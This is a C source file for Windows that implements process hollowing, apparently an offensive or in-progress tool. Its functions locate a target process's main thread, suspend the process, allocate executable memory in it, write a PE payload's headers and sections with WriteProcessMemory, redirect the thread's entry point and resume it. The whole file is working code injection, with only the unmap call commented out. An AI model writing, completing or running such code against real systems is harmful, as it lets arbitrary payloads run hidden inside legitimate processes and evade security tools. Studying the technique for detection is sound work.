#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "native.h"
#include "debug.h"

NtUnmapViewOfSection_t pNtUnmapViewOfSection = NULL;

BOOL InitNtUnmapView() {
    HMODULE hNtDLL = GetModuleHandle("ntdll.dll");
    if (hNtDLL == NULL) {
        LOG_ERROR("Failed to get a handle to ntdll.dll, error: %ld\n", GetLastError());
        return FALSE;
    }

    pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtDLL, "NtUnmapViewOfSection");
    if (pNtUnmapViewOfSection == NULL) {
        LOG_ERROR("Failed to get address of NtUnmapViewOfSection, error: %ld\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
DWORD GetMainThreadId(DWORD dwProcessId) {
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    DWORD mainThreadId = 0;
    FILETIME earliestCreationTime = { MAXDWORD, MAXDWORD };

    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == dwProcessId) {
                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
                if (hThread) {
                    FILETIME creationTime, exitTime, kernelTime, userTime;
                    if (GetThreadTimes(hThread, &creationTime, &exitTime, &kernelTime, &userTime)) {
                        if (CompareFileTime(&creationTime, &earliestCreationTime) == -1) {
                            earliestCreationTime = creationTime;
                            mainThreadId = te32.th32ThreadID;
                        }
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    return mainThreadId;
}


BOOL SuspendProcess(DWORD dwPID) {
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        LOG_ERROR("Failed to take a snapshot of the threads, error: %ld", GetLastError());
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    if (!Thread32First(hThreadSnap, &te32)) {
        LOG_ERROR("Failed to gather information on system threads, error: %ld", GetLastError());
        CloseHandle(hThreadSnap);
        return FALSE;
    }

    BOOL success = FALSE;
    do {
        if (te32.th32OwnerProcessID == dwPID) {
            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
            if (hThread) {
                SuspendThread(hThread);
                CloseHandle(hThread);
                success = TRUE;
            }
        }
    } while (Thread32Next(hThreadSnap, &te32));

    CloseHandle(hThreadSnap);
    return success;
}

BOOL HollowProcess(HANDLE hProcess, PBYTE pPayload, SIZE_T sSize) {
    if (!InitNtUnmapView()) {
        LOG_ERROR("Failed to initialize NtUnmapView, error: %ld", GetLastError());
        return FALSE;
    }
    LOG_SUCCESS("ALL GOOD");

    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pPayload;


    // Ensure the DOS header is valid
    if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        LOG_ERROR("Invalid DOS header signature: 0x%X", pDOSHeader->e_magic);
        return FALSE;
    }


    // Validate e_lfanew
    LOG_INFO("e_lfanew value: %lx", pDOSHeader->e_lfanew);
    if (pDOSHeader->e_lfanew == 0 || pDOSHeader->e_lfanew >= sSize - sizeof(IMAGE_NT_HEADERS)) {
        LOG_ERROR("Invalid e_lfanew: 0x%lx", pDOSHeader->e_lfanew);
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pPayload + pDOSHeader->e_lfanew);

    // Validate NT headers
    if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERROR("Invalid NT header signature: 0x%X", pNTHeaders->Signature);
        return FALSE;
    }

    LOG_SUCCESS("ALL GOOD");

    // Log details before unmapping
    LOG_INFO("Attempting to unmap ImageBase: 0x%p from process: 0x%p", (PVOID)pNTHeaders->OptionalHeader.ImageBase, hProcess);

    // Unmap the existing executable from the target process
    /*
    if (pNtUnmapViewOfSection(hProcess, (PVOID)pNTHeaders->OptionalHeader.ImageBase) != STATUS_SUCCESS) {
        LOG_ERROR("It's jover");
        LOG_ERROR("Failed to unmap the section from the target process, error: %ld", GetLastError());
        return FALSE;
    }
    */
    LOG_SUCCESS("ALL GOOD");
    // Allocate memory in the target process for the new executable
    LPVOID pRemoteImage = VirtualAllocEx(hProcess, (LPVOID)pNTHeaders->OptionalHeader.ImageBase, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteImage) {
        LOG_ERROR("Failed to allocate memory in the target process, error: %ld", GetLastError());
        return FALSE;
    }
    LOG_SUCCESS("ALL GOOD");
    // Write the headers
    if (!WriteProcessMemory(hProcess, pRemoteImage, pPayload, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        LOG_ERROR("Failed to write headers to the target process, error: %ld", GetLastError());
        return FALSE;
    }
    LOG_SUCCESS("ALL GOOD");
    // Write the sections
    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)&pNTHeaders->OptionalHeader + pNTHeaders->FileHeader.SizeOfOptionalHeader + i * sizeof(IMAGE_SECTION_HEADER));
        if (!WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pRemoteImage + pSectionHeader->VirtualAddress), (PBYTE)pPayload + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, NULL)) {
            LOG_ERROR("Failed to write section to the target process, error: %ld", GetLastError());
            return FALSE;
        }
    }
    LOG_SUCCESS("ALL GOOD");
    // Update the context of the main thread
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, GetMainThreadId(GetProcessId(hProcess)));  // Replace with correct thread ID retrieval function
    if (hThread == NULL) {
        LOG_ERROR("Failed to open thread handle, error: %ld", GetLastError());
        return FALSE;
    }
    LOG_SUCCESS("ALL GOOD");
    if (!GetThreadContext(hThread, &ctx)) {
        LOG_ERROR("Failed to get thread context, error: %ld", GetLastError());
        return FALSE;
    }
    LOG_SUCCESS("ALL GOOD");
    #ifdef _WIN64
    ctx.Rax = (DWORD64)((PBYTE)pRemoteImage + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
    #else
    ctx.Eax = (DWORD)((PBYTE)pRemoteImage + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
    #endif
    LOG_SUCCESS("ALL GOOD");
    if (!SetThreadContext(hThread, &ctx)) {
        LOG_ERROR("Failed to set thread context, error: %ld", GetLastError());
        return FALSE;
    }
    LOG_SUCCESS("ALL GOOD");
    // Resume the main thread
    ResumeThread(hThread);
    CloseHandle(hThread);
    LOG_SUCCESS("ALL GOOD");
    return TRUE;
}

